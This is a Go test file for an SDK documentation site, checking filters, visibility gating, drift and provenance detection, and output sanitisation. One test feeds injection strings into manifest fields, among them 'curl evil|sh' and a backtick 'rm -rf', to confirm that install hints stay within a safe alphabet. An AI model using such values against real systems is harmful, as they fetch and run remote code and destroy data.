package sdkdocs

import (
	"context"
	"encoding/json"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/DonaldMurillo/gofastr/core-ui/app"
	"github.com/DonaldMurillo/gofastr/core/schema"
	"github.com/DonaldMurillo/gofastr/framework/entity"
	"github.com/DonaldMurillo/gofastr/framework/sdk"
)

func TestSweepExampleFilterFallsBackToTheRealKey(t *testing.T) {
	cfg := entity.EntityConfig{PrimaryKey: []string{"code"}, Fields: []schema.Field{
		{Name: "code", Type: schema.String, AutoGenerate: schema.AutoUUID},
	}}
	if field, op := exampleFilter(cfg); field != "code" || op != "" {
		t.Fatalf("exampleFilter = (%q, %q), want the key column code with plain equality", field, op)
	}
}

func TestSweepExampleFilterSkipsHidden(t *testing.T) {
	cfg := entity.EntityConfig{Fields: []schema.Field{
		{Name: "secret_score", Type: schema.Int, Hidden: true},
		{Name: "title", Type: schema.String},
	}}
	if field, _ := exampleFilter(cfg); field == "secret_score" {
		t.Fatal("the published example filters on a Hidden field")
	}
}

func TestSweepDriftSeesSnakeCase(t *testing.T) {
	reg := testRegistry()
	for _, snake := range []bool{false, true} {
		s := &site{cfg: Config{Registry: reg, Artifacts: testArtifacts(t, reg, true), SnakeCase: snake}}
		if _, drift, _ := s.resolved(); drift != snake {
			t.Errorf("SnakeCase=%v over a camelCase manifest: drift = %v, want %v", snake, drift, snake)
		}
	}
}

func TestSweepProvenance(t *testing.T) {
	reg := testRegistry()
	noManifest := testArtifacts(t, reg, true)
	delete(noManifest, sdk.ManifestFile)
	oldVersion := testArtifacts(t, reg, true)
	var m sdk.Manifest
	if err := json.Unmarshal(oldVersion[sdk.ManifestFile].Data, &m); err != nil {
		t.Fatal(err)
	}
	m.SchemaVersion++
	raw, _ := json.Marshal(m)
	oldVersion[sdk.ManifestFile] = &fstest.MapFile{Data: raw}
	for name, tc := range map[string]struct {
		fsys       fstest.MapFS
		provenance bool
	}{
		"nothing generated":      {fstest.MapFS{}, false},
		"artifacts, no manifest": {noManifest, true},
		"other schema version":   {oldVersion, true},
		"current manifest":       {testArtifacts(t, reg, true), false},
	} {
		s := &site{cfg: Config{Registry: reg, Artifacts: tc.fsys}}
		_, drift, provenance := s.resolved()
		if provenance != tc.provenance || drift {
			t.Errorf("%s: provenance %v drift %v, want provenance %v and no drift", name, provenance, drift, tc.provenance)
		}
	}
}

func TestSweepVisibilityPolicyAllowsWithoutRequest(t *testing.T) {
	s := &site{cfg: Config{Registry: testRegistry(), BasePath: "/docs/api"}}
	pol := s.entityVisibilityPolicy()
	if d := pol.Decide(context.Background()); d.Kind != app.DecisionAllow {
		t.Fatalf("no request in context: decision %v, want allow", d.Kind)
	}
	r := httptest.NewRequest("GET", "/docs/api/entities/invoices", nil)
	if d := pol.Decide(app.WithRequest(context.Background(), r)); d.Kind == app.DecisionAllow {
		t.Fatal("a gated entity's reference URL was allowed")
	}
}

func TestSweepAllowListMatchesNameOrTable(t *testing.T) {
	post := entity.Define("BlogPost", entity.EntityConfig{Table: "blog_posts", Fields: []schema.Field{{Name: "title", Type: schema.String}}})
	for _, allow := range []string{"BLOG_POSTS", " blogpost "} {
		s := &site{cfg: Config{Registry: &fakeRegistry{entities: []*entity.Entity{post}}, Entities: []string{allow}}}
		if got := s.sortedNames(); len(got) != 1 {
			t.Errorf("Entities [%q] documented %v, want the gated BlogPost", allow, got)
		}
	}
}

var safeFilenameRe = regexp.MustCompile(`^attachment; filename="[A-Za-z0-9._-]+\.zip"$`)

func TestSweepZipFilenameKeepsASafeCharset(t *testing.T) {
	reg := testRegistry()
	dist := testArtifacts(t, reg, true)
	var m sdk.Manifest
	if err := json.Unmarshal(dist[sdk.ManifestFile].Data, &m); err != nil {
		t.Fatal(err)
	}
	m.SDKVersion = `1.0 "x"; y=ü`
	raw, _ := json.Marshal(m)
	dist[sdk.ManifestFile] = &fstest.MapFile{Data: raw}
	srv := mountedServer(t, Config{Registry: reg, Artifacts: dist})
	resp, _ := get(t, srv, "/docs/api/sdk/go.zip")
	if cd := resp.Header.Get("Content-Disposition"); !safeFilenameRe.MatchString(cd) {
		t.Fatalf("Content-Disposition %q carries bytes outside [A-Za-z0-9._-]", cd)
	}
}

func TestSweepCRUDOffIsNotDocumented(t *testing.T) {
	off := false
	e := entity.Define("notes", entity.EntityConfig{
		Exposure: &entity.ExposureConfig{Public: true, CRUD: &off},
		Fields:   []schema.Field{{Name: "title", Type: schema.String}},
	})
	s := &site{cfg: Config{Registry: &fakeRegistry{entities: []*entity.Entity{e}}, IncludeGated: true}}
	if got := s.sortedNames(); len(got) != 0 {
		t.Fatalf("an entity with Exposure.CRUD false is documented: %v", got)
	}
}

func TestSweepDrawerMarksNoPage(t *testing.T) {
	srv := mountedServer(t, Config{Registry: testRegistry(), IncludeGated: true})
	_, body := get(t, srv, "/core-ui/widget/"+drawerName+"/chrome")
	if !strings.Contains(body, "/entities/posts") {
		t.Fatalf("setup broken: the drawer lists no entity:\n%s", body)
	}
	if strings.Contains(body, "aria-current") {
		t.Fatalf("the drawer, mounted once for every page, marks a current page:\n%s", body)
	}
}

func TestSweepVersionsShareOneMenuEntryAndPath(t *testing.T) {
	v1 := entity.Define("posts", entity.EntityConfig{Exposure: &entity.ExposureConfig{Public: true}, Fields: []schema.Field{{Name: "title", Type: schema.String}}})
	v2 := entity.Define("posts", entity.EntityConfig{Exposure: &entity.ExposureConfig{Public: true}, Fields: []schema.Field{{Name: "title", Type: schema.String}}})
	v2.Version = "/api/v2"
	s := &site{cfg: Config{Registry: &fakeRegistry{entities: []*entity.Entity{v1, v2}}, BasePath: "/docs/api"}}
	if paths := (&entityScreen{site: s}).StaticPaths(context.Background()); len(paths) != 1 {
		t.Errorf("StaticPaths = %v, want one page for the shared table", paths)
	}
	for _, g := range s.menuConfig("").Groups {
		if g.Label == "Entities" && len(g.Items) != 1 {
			t.Errorf("menu lists %d entries for one table, want 1", len(g.Items))
		}
	}
}

func TestSweepInstallHintsKeepTheModuleAlphabet(t *testing.T) {
	reg := testRegistry()
	dist := testArtifacts(t, reg, true)
	var m sdk.Manifest
	if err := json.Unmarshal(dist[sdk.ManifestFile].Data, &m); err != nil {
		t.Fatal(err)
	}
	m.App = "acme\ncurl evil|sh"
	a := m.Artifacts["go"]
	a.Module = "local/acme `x`\nrm -rf"
	m.Artifacts["go"] = a
	raw, _ := json.Marshal(m)
	dist[sdk.ManifestFile] = &fstest.MapFile{Data: raw}
	s := &site{cfg: Config{Registry: reg, Artifacts: dist}}
	alphabet := regexp.MustCompile(`^[A-Za-z0-9._~/-]+$`)
	for name, hint := range map[string]string{"goDirHint": s.goDirHint(), "goModuleHint": s.goModuleHint()} {
		if !alphabet.MatchString(hint) {
			t.Errorf("%s = %q, carries bytes outside the module-path alphabet", name, hint)
		}
	}
}

func TestSweepSystemMovesHaveNoRow(t *testing.T) {
	reg := testRegistry()
	reg.entities[1].Config.States = &entity.StatesConfig{Field: "status", Initial: []string{"draft"}, Transitions: []entity.Transition{
		{Key: "publish", From: []string{"draft"}, To: "live"},
		{Key: "expire", From: []string{"live"}, To: "draft", System: true},
	}}
	html := string((&entityScreen{site: &site{cfg: Config{Registry: reg}}}).endpointsTable(reg.entities[1], ""))
	if !strings.Contains(html, "/transitions/publish") || strings.Contains(html, "/transitions/expire") {
		t.Fatalf("endpoints table must list publish and omit the system move expire:\n%s", html)
	}
}

var idAttrRe = regexp.MustCompile(`\sid="([^"]*)"`)

func TestSweepVersionedPageWritesEachIDOnce(t *testing.T) {
	v1 := entity.Define("posts", entity.EntityConfig{Exposure: &entity.ExposureConfig{Public: true}, Fields: []schema.Field{{Name: "views", Type: schema.Int}}})
	v2 := entity.Define("posts", entity.EntityConfig{Exposure: &entity.ExposureConfig{Public: true}, Fields: []schema.Field{{Name: "views", Type: schema.Int}}})
	v2.Version = "/api/v2"
	sc := &entityScreen{site: &site{cfg: Config{Registry: &fakeRegistry{entities: []*entity.Entity{v1, v2}}, BasePath: "/docs/api"}}}
	sc.SetParams(map[string]string{"name": "posts"})
	seen := map[string]bool{}
	for _, m := range idAttrRe.FindAllStringSubmatch(string(sc.Render()), -1) {
		if seen[m[1]] {
			t.Errorf("the two-version page writes id %q twice", m[1])
		}
		seen[m[1]] = true
	}
}

func TestSweepUnknownEntityRendersNotFound(t *testing.T) {
	sc := &entityScreen{site: &site{cfg: Config{Registry: testRegistry(), BasePath: "/docs/api"}}}
	sc.SetParams(map[string]string{"name": "invoices"})
	if html := string(sc.Render()); !strings.Contains(html, "Not found") || strings.Contains(html, "amount") {
		t.Fatalf("a gated entity rendered directly shows its schema instead of Not found:\n%s", html)
	}
}

func TestSweepMountNormalizesPaths(t *testing.T) {
	reg := testRegistry()
	for base, want := range map[string]string{"": "/docs/api", "/": "/docs/api", "help/": "/help"} {
		srv := mountedServer(t, Config{Registry: reg, BasePath: base})
		if resp, _ := get(t, srv, want); resp.StatusCode != 200 {
			t.Errorf("BasePath %q: %s answered %d, want 200", base, want, resp.StatusCode)
		}
	}
}

func TestVersionSlugKeepsDistinctPrefixesDistinct(t *testing.T) {
	a := &entity.Entity{Version: "/api/v1"}
	b := &entity.Entity{Version: "/api-v1"}
	if versionSlug(a) == versionSlug(b) {
		t.Fatalf("/api/v1 and /api-v1 share the section suffix %q", versionSlug(a))
	}
}
